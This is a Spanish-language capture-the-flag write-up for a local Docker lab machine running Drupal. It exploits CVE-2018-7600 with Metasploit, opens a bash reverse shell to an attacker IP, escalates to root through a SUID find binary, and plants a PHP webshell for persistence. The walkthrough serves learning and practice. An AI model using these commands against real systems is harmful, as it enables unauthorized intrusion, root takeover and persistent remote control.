# 🖥️ Máquina: Ejotapete

Dificultad: Fácil
Entorno:Docker
Objetivo: Compromiso completo del sistema hasta root

---

## 📌 Descripción

La máquina **Ejotapete** simula un entorno vulnerable basado en un CMS **Drupal** expuesto a través de un servicio web. El objetivo es identificar la superficie de ataque, explotar una vulnerabilidad crítica en el CMS y escalar privilegios hasta root mediante binarios con permisos SUID.

El vector principal de ataque es una vulnerabilidad en Drupal que permite **ejecución remota de código (RCE) sin autenticación**, lo que facilita el acceso inicial al sistema.

---

## 🖼️ Entorno

![Logo de Ejotapete](/Ejotapete/Imagenes/maquina.png)

---

## 🚀 Despliegue de la máquina

Se inicia el entorno con el script proporcionado:

```bash
sudo bash auto_deploy.sh ejotapete.tar
```

![Máquina iniciada](/Ejotapete/Imagenes/Maquinaini.png)

---

## 🔎 Reconocimiento

### Conectividad

```bash
ping -c4 172.17.0.2
```

El análisis del **TTL** permite inferir el sistema operativo:

* TTL ≈ 64 → Linux
* TTL ≈ 128 → Windows

En este caso, el TTL corresponde a un sistema **Linux**.

---

### Escaneo de puertos

```bash
sudo nmap -p- --open -sS -n -Pn 172.17.0.2
```

Parámetros utilizados:

* `-p-` → todos los puertos
* `--open` → solo puertos abiertos
* `-sS` → SYN scan
* `-n` → sin resolución DNS
* `-Pn` → sin host discovery

Resultado:

* Puerto **80/tcp abierto (HTTP)**

---

## 🌐 Enumeración Web

Acceso inicial:

```
http://172.17.0.2
```

Se obtiene un **403 Forbidden**.

![Página](/Ejotapete/Imagenes/pagina.png)

---

### Fuzzing de directorios

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

Resultado:

```
/drupal
```

![Fuzzing](/Ejotapete/Imagenes/gobuster.png)

Acceso:

```
http://172.17.0.2/drupal
```

![Drupal](/Ejotapete/Imagenes/drupal.png)

---

## 🧠 Identificación de tecnología

```bash
curl -I http://172.17.0.2/drupal/
whatweb http://172.17.0.2/drupal/
```

Se identifica:

* Apache desactualizado
* Drupal vulnerable

---

## ⚠️ Vulnerabilidad

### CVE-2018-7600 (Drupalgeddon2)

### Explicación técnica

Esta vulnerabilidad se encuentra en el **Form API de Drupal**.
Debido a una validación insuficiente de entradas, es posible manipular estructuras internas del formulario para inyectar parámetros maliciosos.

Esto permite la ejecución de funciones PHP arbitrarias en el servidor, derivando en una **ejecución remota de código (RCE) sin autenticación**.

### Impacto

* Ejecución remota de comandos
* Compromiso total del servidor web
* Acceso inicial al sistema

---

## 💥 Explotación con Metasploit

### Preparación

```bash
rm -rf ~/.msf4
msfconsole
reload_all
```

### Selección del exploit

```bash
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
```

Este exploit es adecuado porque automatiza la explotación de la vulnerabilidad **Drupalgeddon2**, permitiendo ejecución remota sin autenticación.

---

### Configuración

```bash
set RHOSTS 172.17.0.2
set TARGETURI /drupal
set PAYLOAD php/reverse_php
set LHOST 192.168.0.108
set LPORT 4444
exploit
```

![Exploit](/Ejotapete/Imagenes/exploit.png)

![Configuración](/Ejotapete/Imagenes/Configuracionmeta.png)

---

## 🐚 Shell inestable

La shell obtenida inicialmente es inestable debido a que PHP ejecuta comandos sin asignar una TTY completa, lo que limita:

* Control de procesos
* Interacción con terminal
* Uso de comandos avanzados

---

## 🔁 Reverse Shell estable

En atacante:

```bash
rlwrap nc -lvnp 4445
```

En víctima:

```bash
bash -c "bash -i >& /dev/tcp/192.168.0.108/4445 0>&1"
```

![Conexión](/Ejotapete/Imagenes/conexion.png)

---

## ⬆️ Escalada de privilegios

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Se identifica:

```
/usr/bin/find
```

### Explotación

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

Esto funciona porque el binario `find` tiene el **bit SUID activo**, lo que permite ejecutar comandos como root.

---

## 👑 Root

```bash
whoami
id
```

Resultado:

```
root
```

![Root](/Ejotapete/Imagenes/rootesca.png)

---

## 🔐 Evidencia final

En el directorio `/root` se encuentra un archivo `.txt` con credenciales del usuario root.

---

## 🕸️ Webshell (persistencia)

Se puede establecer una webshell para ejecución remota:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

Uso:

```
http://172.17.0.2/shell.php?cmd=id
```

![Webshell](/Ejotapete/Imagenes/webshell.png)

---

## 🧾 Conclusión

Se logró el compromiso completo del sistema mediante:

* Enumeración de servicios
* Identificación de CMS vulnerable
* Explotación de **CVE-2018-7600**
* Obtención de shell remota
* Estabilización de acceso
* Escalada de privilegios mediante SUID
* Acceso total como root







